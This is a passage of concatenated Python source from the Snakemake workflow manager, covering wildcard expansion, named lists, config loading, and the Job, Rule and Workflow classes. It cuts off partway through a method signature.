        for match in matches:
            if match.group("constraint"):
                raise SyntaxError(
                    "The wildcards in dynamic files cannot be constrained.")
    return annotated


def touch(value):
    return flag(value, "touch")


def expand(*args, **wildcards):
    """
    Expand wildcards in given filepatterns.

    Arguments
    *args -- first arg: filepatterns as list or one single filepattern,
        second arg (optional): a function to combine wildcard values
        (itertools.product per default)
    **wildcards -- the wildcards as keyword arguments
        with their values as lists
    """
    filepatterns = args[0]
    if len(args) == 1:
        combinator = product
    elif len(args) == 2:
        combinator = args[1]
    if isinstance(filepatterns, str):
        filepatterns = [filepatterns]

    def flatten(wildcards):
        for wildcard, values in wildcards.items():
            if isinstance(values, str) or not isinstance(values, Iterable):
                values = [values]
            yield [(wildcard, value) for value in values]

    try:
        return [filepattern.format(**comb)
                for comb in map(dict, combinator(*flatten(wildcards))) for
                filepattern in filepatterns]
    except KeyError as e:
        raise WildcardError("No values given for wildcard {}.".format(e))


def limit(pattern, **wildcards):
    """
    Limit wildcards to the given values.

    Arguments:
    **wildcards -- the wildcards as keyword arguments
                   with their values as lists
    """
    return pattern.format(**{
        wildcard: "{{{},{}}}".format(wildcard, "|".join(values))
        for wildcard, values in wildcards.items()
    })


def glob_wildcards(pattern):
    """
    Glob the values of the wildcards by matching the given pattern to the filesystem.
    Returns a named tuple with a list of values for each wildcard.
    """
    pattern = os.path.normpath(pattern)
    first_wildcard = re.search("{[^{]", pattern)
    dirname = os.path.dirname(pattern[:first_wildcard.start(
    )]) if first_wildcard else os.path.dirname(pattern)
    if not dirname:
        dirname = "."

    names = [match.group('name')
             for match in _wildcard_regex.finditer(pattern)]
    Wildcards = namedtuple("Wildcards", names)
    wildcards = Wildcards(*[list() for name in names])

    pattern = re.compile(regex(pattern))
    for dirpath, dirnames, filenames in os.walk(dirname):
        for f in chain(filenames, dirnames):
            if dirpath != ".":
                f = os.path.join(dirpath, f)
            match = re.match(pattern, f)
            if match:
                for name, value in match.groupdict().items():
                    getattr(wildcards, name).append(value)
    return wildcards


# TODO rewrite Namedlist!
class Namedlist(list):
    """
    A list that additionally provides functions to name items. Further,
    it is hashable, however the hash does not consider the item names.
    """

    def __init__(self, toclone=None, fromdict=None, plainstr=False):
        """
        Create the object.

        Arguments
        toclone  -- another Namedlist that shall be cloned
        fromdict -- a dict that shall be converted to a
            Namedlist (keys become names)
        """
        list.__init__(self)
        self._names = dict()

        if toclone:
            self.extend(map(str, toclone) if plainstr else toclone)
            if isinstance(toclone, Namedlist):
                self.take_names(toclone.get_names())
        if fromdict:
            for key, item in fromdict.items():
                self.append(item)
                self.add_name(key)

    def add_name(self, name):
        """
        Add a name to the last item.

        Arguments
        name -- a name
        """
        self.set_name(name, len(self) - 1)

    def set_name(self, name, index, end=None):
        """
        Set the name of an item.

        Arguments
        name  -- a name
        index -- the item index
        """
        self._names[name] = (index, end)
        if end is None:
            setattr(self, name, self[index])
        else:
            setattr(self, name, Namedlist(toclone=self[index:end]))

    def get_names(self):
        """
        Get the defined names as (name, index) pairs.
        """
        for name, index in self._names.items():
            yield name, index

    def take_names(self, names):
        """
        Take over the given names.

        Arguments
        names -- the given names as (name, index) pairs
        """
        for name, (i, j) in names:
            self.set_name(name, i, end=j)

    def items(self):
        for name in self._names:
            yield name, getattr(self, name)

    def allitems(self):
        next = 0
        for name, index in sorted(self._names.items(),
                                  key=lambda item: item[1][0]):
            start, end = index
            if end is None:
                end = start + 1
            if start > next:
                for item in self[next:start]:
                    yield None, item
            yield name, getattr(self, name)
            next = end
        for item in self[next:]:
            yield None, item

    def insert_items(self, index, items):
        self[index:index + 1] = items
        add = len(items) - 1
        for name, (i, j) in self._names.items():
            if i > index:
                self._names[name] = (i + add, j + add)
            elif i == index:
                self.set_name(name, i, end=i + len(items))

    def keys(self):
        return self._names

    def plainstrings(self):
        return self.__class__.__call__(toclone=self, plainstr=True)

    def __getitem__(self, key):
        try:
            return super().__getitem__(key)
        except TypeError:
            pass
        return getattr(self, key)

    def __hash__(self):
        return hash(tuple(self))

    def __str__(self):
        return " ".join(map(str, self))


class InputFiles(Namedlist):
    pass


class OutputFiles(Namedlist):
    pass


class Wildcards(Namedlist):
    pass


class Params(Namedlist):
    pass


class Resources(Namedlist):
    pass


class Log(Namedlist):
    pass


def _load_configfile(configpath):
    "Tries to load a configfile first as JSON, then as YAML, into a dict."
    try:
        with open(configpath) as f:
            try:
                return json.load(f)
            except ValueError:
                f.seek(0)  # try again
            try:
                import yaml
            except ImportError:
                raise WorkflowError("Config file is not valid JSON and PyYAML "
                                    "has not been installed. Please install "
                                    "PyYAML to use YAML config files.")
            try:
                return yaml.load(f)
            except yaml.YAMLError:
                raise WorkflowError("Config file is not valid JSON or YAML.")
    except FileNotFoundError:
        raise WorkflowError("Config file {} not found.".format(configpath))


def load_configfile(configpath):
    "Loads a JSON or YAML configfile as a dict, then checks that it's a dict."
    config = _load_configfile(configpath)
    if not isinstance(config, dict):
        raise WorkflowError("Config file must be given as JSON or YAML "
                            "with keys at top level.")
    return config

##### Wildcard pumping detection #####


class PeriodicityDetector:
    def __init__(self, min_repeat=50, max_repeat=100):
        """
        Args:
            max_len (int): The maximum length of the periodic substring.
        """
        self.regex = re.compile(
            "((?P<value>.+)(?P=value){{{min_repeat},{max_repeat}}})$".format(
                min_repeat=min_repeat - 1,
                max_repeat=max_repeat - 1))

    def is_periodic(self, value):
        """Returns the periodic substring or None if not periodic."""
        m = self.regex.search(value)  # search for a periodic suffix.
        if m is not None:
            return m.group("value")

__author__ = "Johannes Kster"
__copyright__ = "Copyright 2015, Johannes Kster"
__email__ = "koester@jimmy.harvard.edu"
__license__ = "MIT"

import os
import sys
import base64
import json

from collections import defaultdict
from itertools import chain
from functools import partial
from operator import attrgetter

from snakemake.io import IOFile, Wildcards, Resources, _IOFile                    
from snakemake.utils import format, listfiles
from snakemake.exceptions import RuleException, ProtectedOutputException
from snakemake.exceptions import UnexpectedOutputException
from snakemake.logging import logger


def jobfiles(jobs, type):
    return chain(*map(attrgetter(type), jobs))


class Job:
    HIGHEST_PRIORITY = sys.maxsize

    def __init__(self, rule, dag, targetfile=None, format_wildcards=None):
        self.rule = rule
        self.dag = dag
        self.targetfile = targetfile

        self.wildcards_dict = self.rule.get_wildcards(targetfile)
        self.wildcards = Wildcards(fromdict=self.wildcards_dict)
        self._format_wildcards = (self.wildcards if format_wildcards is None
                                  else Wildcards(fromdict=format_wildcards))

        (self.input, self.output, self.params, self.log, self.benchmark,
         self.ruleio,
         self.dependencies) = rule.expand_wildcards(self.wildcards_dict)

        self.resources_dict = {
            name: min(self.rule.workflow.global_resources.get(name, res), res)
            for name, res in rule.resources.items()
        }
        self.threads = self.resources_dict["_cores"]
        self.resources = Resources(fromdict=self.resources_dict)
        self._inputsize = None

        self.dynamic_output, self.dynamic_input = set(), set()
        self.temp_output, self.protected_output = set(), set()
        self.touch_output = set()
        self.subworkflow_input = dict()
        for f in self.output:
            f_ = self.ruleio[f]
            if f_ in self.rule.dynamic_output:
                self.dynamic_output.add(f)
            if f_ in self.rule.temp_output:
                self.temp_output.add(f)
            if f_ in self.rule.protected_output:
                self.protected_output.add(f)
            if f_ in self.rule.touch_output:
                self.touch_output.add(f)
        for f in self.input:
            f_ = self.ruleio[f]
            if f_ in self.rule.dynamic_input:
                self.dynamic_input.add(f)
            if f_ in self.rule.subworkflow_input:
                self.subworkflow_input[f] = self.rule.subworkflow_input[f_]
        self._hash = self.rule.__hash__()
        if True or not self.dynamic_output:
            for o in self.output:
                self._hash ^= o.__hash__()

    @property
    def priority(self):
        return self.dag.priority(self)

    @property
    def b64id(self):
        return base64.b64encode((self.rule.name + "".join(self.output)
                                 ).encode("utf-8")).decode("utf-8")

    @property
    def inputsize(self):
        """
        Return the size of the input files.
        Input files need to be present.
        """
        if self._inputsize is None:
            self._inputsize = sum(f.size for f in self.input)
        return self._inputsize

    @property
    def message(self):
        """ Return the message for this job. """
        try:
            return (self.format_wildcards(self.rule.message) if
                    self.rule.message else None)
        except AttributeError as ex:
            raise RuleException(str(ex), rule=self.rule)
        except KeyError as ex:
            raise RuleException("Unknown variable in message "
                                "of shell command: {}".format(str(ex)),
                                rule=self.rule)

    @property
    def shellcmd(self):
        """ Return the shell command. """
        try:
            return (self.format_wildcards(self.rule.shellcmd) if
                    self.rule.shellcmd else None)
        except AttributeError as ex:
            raise RuleException(str(ex), rule=self.rule)
        except KeyError as ex:
            raise RuleException("Unknown variable when printing "
                                "shell command: {}".format(str(ex)),
                                rule=self.rule)

    @property
    def expanded_output(self):
        """ Iterate over output files while dynamic output is expanded. """
        for f, f_ in zip(self.output, self.rule.output):
            if f in self.dynamic_output:
                expansion = self.expand_dynamic(
                    f_,
                    restriction=self.wildcards,
                    omit_value=_IOFile.dynamic_fill)
                if not expansion:
                    yield f_
                for f, _ in expansion:
                    yield IOFile(f, self.rule)                    
            else:
                yield f

    @property
    def dynamic_wildcards(self):
        """ Return all wildcard values determined from dynamic output. """
        combinations = set()
        for f, f_ in zip(self.output, self.rule.output):
            if f in self.dynamic_output:
                for f, w in self.expand_dynamic(
                    f_,
                    restriction=self.wildcards,
                    omit_value=_IOFile.dynamic_fill):
                    combinations.add(tuple(w.items()))
        wildcards = defaultdict(list)
        for combination in combinations:
            for name, value in combination:
                wildcards[name].append(value)
        return wildcards

    @property
    def missing_input(self):
        """ Return missing input files. """
        # omit file if it comes from a subworkflow
        return set(f for f in self.input
                   if not f.exists and not f in self.subworkflow_input)

    @property
    def output_mintime(self):
        """ Return oldest output file. """
        existing = [f.mtime for f in self.expanded_output if f.exists]
        if self.benchmark and self.benchmark.exists:
            existing.append(self.benchmark.mtime)
        if existing:
            return min(existing)
        return None

    @property
    def input_maxtime(self):
        """ Return newest input file. """
        existing = [f.mtime for f in self.input if f.exists]
        if existing:
            return max(existing)
        return None

    def missing_output(self, requested=None):
        """ Return missing output files. """
        files = set()
        if self.benchmark and (requested is None or
                               self.benchmark in requested):
            if not self.benchmark.exists:
                files.add(self.benchmark)

        for f, f_ in zip(self.output, self.rule.output):
            if requested is None or f in requested:
                if f in self.dynamic_output:
                    if not self.expand_dynamic(
                        f_,
                        restriction=self.wildcards,
                        omit_value=_IOFile.dynamic_fill):
                        files.add("{} (dynamic)".format(f_))
                elif not f.exists:
                    files.add(f)
        return files

    @property
    def existing_output(self):
        return filter(lambda f: f.exists, self.expanded_output)

    def check_protected_output(self):
        protected = list(filter(lambda f: f.protected, self.expanded_output))
        if protected:
            raise ProtectedOutputException(self.rule, protected)

    def prepare(self):
        """
        Prepare execution of job.
        This includes creation of directories and deletion of previously
        created dynamic files.
        """

        self.check_protected_output()

        unexpected_output = self.dag.reason(self).missing_output.intersection(
            self.existing_output)
        if unexpected_output:
            logger.warning(
                "Warning: the following output files of rule {} were not "
                "present when the DAG was created:\n{}".format(
                    self.rule, unexpected_output))

        if self.dynamic_output:
            for f, _ in chain(*map(partial(self.expand_dynamic,
                                           restriction=self.wildcards,
                                           omit_value=_IOFile.dynamic_fill),
                                   self.rule.dynamic_output)):
                os.remove(f)
        for f, f_ in zip(self.output, self.rule.output):
            f.prepare()
        for f in self.log:
            f.prepare()
        if self.benchmark:
            self.benchmark.prepare()

    def cleanup(self):
        """ Cleanup output files. """
        to_remove = [f for f in self.expanded_output if f.exists]
        if to_remove:
            logger.info("Removing output files of failed job {}"
                        " since they might be corrupted:\n{}".format(
                            self, ", ".join(to_remove)))
            for f in to_remove:
                f.remove()

    def format_wildcards(self, string, **variables):
        """ Format a string with variables from the job. """
        _variables = dict()
        _variables.update(self.rule.workflow.globals)
        _variables.update(dict(input=self.input,
                               output=self.output,
                               params=self.params,
                               wildcards=self._format_wildcards,
                               threads=self.threads,
                               resources=self.resources,
                               log=self.log,
                               version=self.rule.version,
                               rule=self.rule.name, ))
        _variables.update(variables)
        try:
            return format(string, **_variables)
        except NameError as ex:
            raise RuleException("NameError: " + str(ex), rule=self.rule)
        except IndexError as ex:
            raise RuleException("IndexError: " + str(ex), rule=self.rule)

    def properties(self, omit_resources="_cores _nodes".split()):
        resources = {
            name: res
            for name, res in self.resources.items()
            if name not in omit_resources
        }
        params = {name: value for name, value in self.params.items()}
        properties = {
            "rule": self.rule.name,
            "local": self.dag.workflow.is_local(self.rule),
            "input": self.input,
            "output": self.output,
            "params": params,
            "threads": self.threads,
            "resources": resources
        }
        return properties

    def json(self):
        return json.dumps(self.properties())

    def __repr__(self):
        return self.rule.name

    def __eq__(self, other):
        if other is None:
            return False
        return self.rule == other.rule and (
            self.dynamic_output or self.wildcards_dict == other.wildcards_dict)

    def __lt__(self, other):
        return self.rule.__lt__(other.rule)

    def __gt__(self, other):
        return self.rule.__gt__(other.rule)

    def __hash__(self):
        return self._hash

    @staticmethod
    def expand_dynamic(pattern, restriction=None, omit_value=None):
        """ Expand dynamic files. """
        return list(listfiles(pattern,
                              restriction=restriction,
                              omit_value=omit_value))


class Reason:
    def __init__(self):
        self.updated_input = set()
        self.updated_input_run = set()
        self.missing_output = set()
        self.incomplete_output = set()
        self.forced = False
        self.noio = False
        self.nooutput = False
        self.derived = True

    def __str__(self):
        s = list()
        if self.forced:
            s.append("Forced execution")
        else:
            if self.noio:
                s.append("Rules with neither input nor "
                         "output files are always executed.")
            elif self.nooutput:
                s.append("Rules with a run or shell declaration but no output "
                         "are always executed.")
            else:
                if self.missing_output:
                    s.append("Missing output files: {}".format(
                        ", ".join(self.missing_output)))
                if self.incomplete_output:
                    s.append("Incomplete output files: {}".format(
                        ", ".join(self.incomplete_output)))
                updated_input = self.updated_input - self.updated_input_run
                if updated_input:
                    s.append("Updated input files: {}".format(
                        ", ".join(updated_input)))
                if self.updated_input_run:
                    s.append("Input files updated by another job: {}".format(
                        ", ".join(self.updated_input_run)))
        s = "; ".join(s)
        return s

    def __bool__(self):
        return bool(self.updated_input or self.missing_output or self.forced or
                    self.updated_input_run or self.noio or self.nooutput)

__author__ = "Johannes Kster"
__copyright__ = "Copyright 2015, Johannes Kster"
__email__ = "koester@jimmy.harvard.edu"
__license__ = "MIT"

import os
import re
import sys
import inspect
import sre_constants
from collections import defaultdict

from snakemake.io import IOFile, _IOFile, protected, temp, dynamic, Namedlist
from snakemake.io import expand, InputFiles, OutputFiles, Wildcards, Params, Log
from snakemake.io import apply_wildcards, is_flagged, not_iterable
from snakemake.exceptions import RuleException, IOFileException, WildcardError, InputFunctionException


class Rule:
    def __init__(self, *args, lineno=None, snakefile=None):
        """
        Create a rule

        Arguments
        name -- the name of the rule
        """
        if len(args) == 2:
            name, workflow = args
            self.name = name
            self.workflow = workflow
            self.docstring = None
            self.message = None
            self._input = InputFiles()
            self._output = OutputFiles()
            self._params = Params()
            self.dependencies = dict()
            self.dynamic_output = set()
            self.dynamic_input = set()
            self.temp_output = set()
            self.protected_output = set()
            self.touch_output = set()
            self.subworkflow_input = dict()
            self.resources = dict(_cores=1, _nodes=1)
            self.priority = 0
            self.version = None
            self._log = Log()
            self._benchmark = None
            self.wildcard_names = set()
            self.lineno = lineno
            self.snakefile = snakefile
            self.run_func = None
            self.shellcmd = None
            self.norun = False
        elif len(args) == 1:
            other = args[0]
            self.name = other.name
            self.workflow = other.workflow
            self.docstring = other.docstring
            self.message = other.message
            self._input = InputFiles(other._input)
            self._output = OutputFiles(other._output)
            self._params = Params(other._params)
            self.dependencies = dict(other.dependencies)
            self.dynamic_output = set(other.dynamic_output)
            self.dynamic_input = set(other.dynamic_input)
            self.temp_output = set(other.temp_output)
            self.protected_output = set(other.protected_output)
            self.touch_output = set(other.touch_output)
            self.subworkflow_input = dict(other.subworkflow_input)
            self.resources = other.resources
            self.priority = other.priority
            self.version = other.version
            self._log = other._log
            self._benchmark = other._benchmark
            self.wildcard_names = set(other.wildcard_names)
            self.lineno = other.lineno
            self.snakefile = other.snakefile
            self.run_func = other.run_func
            self.shellcmd = other.shellcmd
            self.norun = other.norun

    def dynamic_branch(self, wildcards, input=True):
        def get_io(rule):
            return (rule.input, rule.dynamic_input) if input else (
                rule.output, rule.dynamic_output
            )

        io, dynamic_io = get_io(self)

        branch = Rule(self)
        io_, dynamic_io_ = get_io(branch)

        expansion = defaultdict(list)
        for i, f in enumerate(io):
            if f in dynamic_io:
                try:
                    for e in reversed(expand(f, zip, **wildcards)):
                        expansion[i].append(IOFile(e, rule=branch))                    
                except KeyError:
                    return None

        # replace the dynamic files with the expanded files
        replacements = [(i, io[i], e)
                        for i, e in reversed(list(expansion.items()))]
        for i, old, exp in replacements:
            dynamic_io_.remove(old)
            io_.insert_items(i, exp)

        if not input:
            for i, old, exp in replacements:
                if old in branch.temp_output:
                    branch.temp_output.discard(old)
                    branch.temp_output.update(exp)
                if old in branch.protected_output:
                    branch.protected_output.discard(old)
                    branch.protected_output.update(exp)
                if old in branch.touch_output:
                    branch.touch_output.discard(old)
                    branch.touch_output.update(exp)

            branch.wildcard_names.clear()
            non_dynamic_wildcards = dict((name, values[0])
                                         for name, values in wildcards.items()
                                         if len(set(values)) == 1)
            # TODO have a look into how to concretize dependencies here
            (branch._input, branch._output, branch._params, branch._log,
             branch._benchmark, _, branch.dependencies
             ) = branch.expand_wildcards(wildcards=non_dynamic_wildcards)
            return branch, non_dynamic_wildcards
        return branch

    def has_wildcards(self):
        """
        Return True if rule contains wildcards.
        """
        return bool(self.wildcard_names)

    @property
    def benchmark(self):
        return self._benchmark

    @benchmark.setter
    def benchmark(self, benchmark):
        self._benchmark = IOFile(benchmark, rule=self)

    @property
    def input(self):
        return self._input

    def set_input(self, *input, **kwinput):
        """
        Add a list of input files. Recursive lists are flattened.

        Arguments
        input -- the list of input files
        """
        for item in input:
            self._set_inoutput_item(item)
        for name, item in kwinput.items():
            self._set_inoutput_item(item, name=name)

    @property
    def output(self):
        return self._output

    @property
    def products(self):
        products = list(self.output)
        if self.benchmark:
            products.append(self.benchmark)
        return products

    def set_output(self, *output, **kwoutput):
        """
        Add a list of output files. Recursive lists are flattened.

        Arguments
        output -- the list of output files
        """
        for item in output:
            self._set_inoutput_item(item, output=True)
        for name, item in kwoutput.items():
            self._set_inoutput_item(item, output=True, name=name)

        for item in self.output:
            if self.dynamic_output and item not in self.dynamic_output:
                raise SyntaxError(
                    "A rule with dynamic output may not define any "
                    "non-dynamic output files.")
            wildcards = item.get_wildcard_names()
            if self.wildcard_names:
                if self.wildcard_names != wildcards:
                    raise SyntaxError(
                        "Not all output files of rule {} "
                        "contain the same wildcards.".format(self.name))
            else:
                self.wildcard_names = wildcards

    def _set_inoutput_item(self, item, output=False, name=None):
        """
        Set an item to be input or output.

        Arguments
        item     -- the item
        inoutput -- either a Namedlist of input or output items
        name     -- an optional name for the item
        """
        inoutput = self.output if output else self.input
        if isinstance(item, str):
            # add the rule to the dependencies
            if isinstance(item, _IOFile):
                self.dependencies[item] = item.rule
            _item = IOFile(item, rule=self)
            if is_flagged(item, "temp"):
                if not output:
                    raise SyntaxError("Only output files may be temporary")
                self.temp_output.add(_item)
            if is_flagged(item, "protected"):
                if not output:
                    raise SyntaxError("Only output files may be protected")
                self.protected_output.add(_item)
            if is_flagged(item, "touch"):
                if not output:
                    raise SyntaxError(
                        "Only output files may be marked for touching.")
                self.touch_output.add(_item)
            if is_flagged(item, "dynamic"):
                if output:
                    self.dynamic_output.add(_item)
                else:
                    self.dynamic_input.add(_item)
            if is_flagged(item, "subworkflow"):
                if output:
                    raise SyntaxError(
                        "Only input files may refer to a subworkflow")
                else:
                    # record the workflow this item comes from
                    self.subworkflow_input[_item] = item.flags["subworkflow"]
            inoutput.append(_item)
            if name:
                inoutput.add_name(name)
        elif callable(item):
            if output:
                raise SyntaxError(
                    "Only input files can be specified as functions")
            inoutput.append(item)
            if name:
                inoutput.add_name(name)
        else:
            try:
                start = len(inoutput)
                for i in item:
                    self._set_inoutput_item(i, output=output)
                if name:
                    # if the list was named, make it accessible
                    inoutput.set_name(name, start, end=len(inoutput))
            except TypeError:
                raise SyntaxError(
                    "Input and output files have to be specified as strings or lists of strings.")

    @property
    def params(self):
        return self._params

    def set_params(self, *params, **kwparams):
        for item in params:
            self._set_params_item(item)
        for name, item in kwparams.items():
            self._set_params_item(item, name=name)

    def _set_params_item(self, item, name=None):
        if isinstance(item, str) or callable(item):
            self.params.append(item)
            if name:
                self.params.add_name(name)
        else:
            try:
                start = len(self.params)
                for i in item:
                    self._set_params_item(i)
                if name:
                    self.params.set_name(name, start, end=len(self.params))
            except TypeError:
                raise SyntaxError("Params have to be specified as strings.")

    @property
    def log(self):
        return self._log

    def set_log(self, *logs, **kwlogs):
        for item in logs:
            self._set_log_item(item)
        for name, item in kwlogs.items():
            self._set_log_item(item, name=name)

    def _set_log_item(self, item, name=None):
        if isinstance(item, str) or callable(item):
            self.log.append(IOFile(item,
                                   rule=self)
                            if isinstance(item, str) else item)
            if name:
                self.log.add_name(name)
        else:
            try:
                start = len(self.log)
                for i in item:
                    self._set_log_item(i)
                if name:
                    self.log.set_name(name, start, end=len(self.log))
            except TypeError:
                raise SyntaxError("Log files have to be specified as strings.")

    def expand_wildcards(self, wildcards=None):
        """
        Expand wildcards depending on the requested output
        or given wildcards dict.
        """

        def concretize_iofile(f, wildcards):
            if not isinstance(f, _IOFile):
                return IOFile(f, rule=self)
            else:
                return f.apply_wildcards(wildcards,
                                         fill_missing=f in self.dynamic_input,
                                         fail_dynamic=self.dynamic_output)

        def _apply_wildcards(newitems, olditems, wildcards, wildcards_obj,
                             concretize=apply_wildcards,
                             ruleio=None):
            for name, item in olditems.allitems():
                start = len(newitems)
                is_iterable = True
                if callable(item):
                    try:
                        item = item(wildcards_obj)
                    except (Exception, BaseException) as e:
                        raise InputFunctionException(e, rule=self)
                    if not_iterable(item):
                        item = [item]
                        is_iterable = False
                    for item_ in item:
                        if not isinstance(item_, str):
                            raise RuleException(
                                "Input function did not return str or list of str.",
                                rule=self)
                        concrete = concretize(item_, wildcards)
                        newitems.append(concrete)
                        if ruleio is not None:
                            ruleio[concrete] = item_
                else:
                    if not_iterable(item):
                        item = [item]
                        is_iterable = False
                    for item_ in item:
                        concrete = concretize(item_, wildcards)
                        newitems.append(concrete)
                        if ruleio is not None:
                            ruleio[concrete] = item_
                if name:
                    newitems.set_name(
                        name, start,
                        end=len(newitems) if is_iterable else None)

        if wildcards is None:
            wildcards = dict()
        missing_wildcards = self.wildcard_names - set(wildcards.keys())

        if missing_wildcards:
            raise RuleException(
                "Could not resolve wildcards in rule {}:\n{}".format(
                    self.name, "\n".join(self.wildcard_names)),
                lineno=self.lineno,
                snakefile=self.snakefile)

        ruleio = dict()

        try:
            input = InputFiles()
            wildcards_obj = Wildcards(fromdict=wildcards)
            _apply_wildcards(input, self.input, wildcards, wildcards_obj,
                             concretize=concretize_iofile,
                             ruleio=ruleio)

            params = Params()
            _apply_wildcards(params, self.params, wildcards, wildcards_obj)

            output = OutputFiles(o.apply_wildcards(wildcards)
                                 for o in self.output)
            output.take_names(self.output.get_names())

            dependencies = {
                None if f is None else f.apply_wildcards(wildcards): rule
                for f, rule in self.dependencies.items()
            }

            ruleio.update(dict((f, f_) for f, f_ in zip(output, self.output)))

            log = Log()
            _apply_wildcards(log, self.log, wildcards, wildcards_obj,
                             concretize=concretize_iofile)

            benchmark = self.benchmark.apply_wildcards(
                wildcards) if self.benchmark else None
            return input, output, params, log, benchmark, ruleio, dependencies
        except WildcardError as ex:
            # this can only happen if an input contains an unresolved wildcard.
            raise RuleException(
                "Wildcards in input, params, log or benchmark file of rule {} cannot be "
                "determined from output files:\n{}".format(self, str(ex)),
                lineno=self.lineno,
                snakefile=self.snakefile)

    def is_producer(self, requested_output):
        """
        Returns True if this rule is a producer of the requested output.
        """
        try:
            for o in self.products:
                if o.match(requested_output):
                    return True
            return False
        except sre_constants.error as ex:
            raise IOFileException("{} in wildcard statement".format(ex),
                                  snakefile=self.snakefile,
                                  lineno=self.lineno)
        except ValueError as ex:
            raise IOFileException("{}".format(ex),
                                  snakefile=self.snakefile,
                                  lineno=self.lineno)

    def get_wildcards(self, requested_output):
        """
        Update the given wildcard dictionary by matching regular expression
        output files to the requested concrete ones.

        Arguments
        wildcards -- a dictionary of wildcards
        requested_output -- a concrete filepath
        """
        if requested_output is None:
            return dict()
        bestmatchlen = 0
        bestmatch = None

        for o in self.products:
            match = o.match(requested_output)
            if match:
                l = self.get_wildcard_len(match.groupdict())
                if not bestmatch or bestmatchlen > l:
                    bestmatch = match.groupdict()
                    bestmatchlen = l
        return bestmatch

    @staticmethod
    def get_wildcard_len(wildcards):
        """
        Return the length of the given wildcard values.

        Arguments
        wildcards -- a dict of wildcards
        """
        return sum(map(len, wildcards.values()))

    def __lt__(self, rule):
        comp = self.workflow._ruleorder.compare(self, rule)
        return comp < 0

    def __gt__(self, rule):
        comp = self.workflow._ruleorder.compare(self, rule)
        return comp > 0

    def __str__(self):
        return self.name

    def __hash__(self):
        return self.name.__hash__()

    def __eq__(self, other):
        return self.name == other.name


class Ruleorder:
    def __init__(self):
        self.order = list()

    def add(self, *rulenames):
        """
        Records the order of given rules as rule1 > rule2 > rule3, ...
        """
        self.order.append(list(rulenames))

    def compare(self, rule1, rule2):
        """
        Return whether rule2 has a higher priority than rule1.
        """
        # try the last clause first,
        # i.e. clauses added later overwrite those before.
        for clause in reversed(self.order):
            try:
                i = clause.index(rule1.name)
                j = clause.index(rule2.name)
                # rules with higher priority should have a smaller index
                comp = j - i
                if comp < 0:
                    comp = -1
                elif comp > 0:
                    comp = 1
                return comp
            except ValueError:
                pass

        # if not ruleorder given, prefer rule without wildcards
        wildcard_cmp = rule2.has_wildcards() - rule1.has_wildcards()
        if wildcard_cmp != 0:
            return wildcard_cmp

        return 0

    def __iter__(self):
        return self.order.__iter__()

__author__ = "Johannes Kster"
__copyright__ = "Copyright 2015, Johannes Kster"
__email__ = "koester@jimmy.harvard.edu"
__license__ = "MIT"

import re
import os
import sys
import signal
import json
import urllib
from collections import OrderedDict
from itertools import filterfalse, chain
from functools import partial
from operator import attrgetter

from snakemake.logging import logger, format_resources, format_resource_names
from snakemake.rules import Rule, Ruleorder
from snakemake.exceptions import RuleException, CreateRuleException, \
    UnknownRuleException, NoRulesException, print_exception, WorkflowError
from snakemake.shell import shell
from snakemake.dag import DAG
from snakemake.scheduler import JobScheduler
from snakemake.parser import parse
import snakemake.io
from snakemake.io import protected, temp, temporary, expand, dynamic, glob_wildcards, flag, not_iterable, touch                    
from snakemake.persistence import Persistence
from snakemake.utils import update_config


class Workflow:
    def __init__(self,
                 snakefile=None,
                 snakemakepath=None,
                 jobscript=None,
                 overwrite_shellcmd=None,
                 overwrite_config=dict(),
                 overwrite_workdir=None,
                 overwrite_configfile=None,
                 config_args=None,
                 debug=False):
        """
        Create the controller.
        """
        self._rules = OrderedDict()
        self.first_rule = None
        self._workdir = None
        self.overwrite_workdir = overwrite_workdir
        self.workdir_init = os.path.abspath(os.curdir)
        self._ruleorder = Ruleorder()
        self._localrules = set()
        self.linemaps = dict()
        self.rule_count = 0
        self.basedir = os.path.dirname(snakefile)
        self.snakefile = os.path.abspath(snakefile)
        self.snakemakepath = snakemakepath
        self.included = []
        self.included_stack = []
        self.jobscript = jobscript
        self.persistence = None
        self.global_resources = None
        self.globals = globals()
        self._subworkflows = dict()
        self.overwrite_shellcmd = overwrite_shellcmd
        self.overwrite_config = overwrite_config
        self.overwrite_configfile = overwrite_configfile
        self.config_args = config_args
        self._onsuccess = lambda log: None
        self._onerror = lambda log: None
        self.debug = debug

        global config
        config = dict()
        config.update(self.overwrite_config)

        global rules
        rules = Rules()

    @property
    def subworkflows(self):
        return self._subworkflows.values()

    @property
    def rules(self):
        return self._rules.values()

    @property
    def concrete_files(self):
        return (
            file
            for rule in self.rules for file in chain(rule.input, rule.output)
            if not callable(file) and not file.contains_wildcard()
        )

    def check(self):
        for clause in self._ruleorder:
            for rulename in clause:
                if not self.is_rule(rulename):
                    raise UnknownRuleException(
                        rulename,
                        prefix="Error in ruleorder definition.")

    def add_rule(self, name=None, lineno=None, snakefile=None):
        """
        Add a rule.
        """
        if name is None:
            name = str(len(self._rules) + 1)
        if self.is_rule(name):
            raise CreateRuleException(
                "The name {} is already used by another rule".format(name))
        rule = Rule(name, self, lineno=lineno, snakefile=snakefile)
        self._rules[rule.name] = rule
        self.rule_count += 1
        if not self.first_rule:
            self.first_rule = rule.name
        return name

    def is_rule(self, name):
        """
        Return True if name is the name of a rule.

        Arguments
        name -- a name
        """
        return name in self._rules

    def get_rule(self, name):
        """
        Get rule by name.

        Arguments
        name -- the name of the rule
        """
        if not self._rules:
            raise NoRulesException()
        if not name in self._rules:
            raise UnknownRuleException(name)
        return self._rules[name]

    def list_rules(self, only_targets=False):
        rules = self.rules
        if only_targets:
            rules = filterfalse(Rule.has_wildcards, rules)
        for rule in rules:
            logger.rule_info(name=rule.name, docstring=rule.docstring)

    def list_resources(self):
        for resource in set(
            resource for rule in self.rules for resource in rule.resources):
            if resource not in "_cores _nodes".split():
                logger.info(resource)

    def is_local(self, rule):
        return rule.name in self._localrules or rule.norun

    def execute(self,
                targets=None,
                dryrun=False,
                touch=False,
                cores=1,
                nodes=1,
                local_cores=1,
                forcetargets=False,
                forceall=False,
                forcerun=None,
                prioritytargets=None,
                quiet=False,
                keepgoing=False,
                printshellcmds=False,
                printreason=False,
                printdag=False,
                cluster=None,
                cluster_config=None,
                cluster_sync=None,
                jobname=None,
                immediate_submit=False,
                ignore_ambiguity=False,
                printrulegraph=False,
                printd3dag=False,
                drmaa=None,
                stats=None,
                force_incomplete=False,
                ignore_incomplete=False,
                list_version_changes=False,
                list_code_changes=False,
                list_input_changes=False,
                list_params_changes=False,
                summary=False,
                detailed_summary=False,
                latency_wait=3,
                benchmark_repeats=3,
                wait_for_files=None,
                nolock=False,
                unlock=False,
                resources=None,
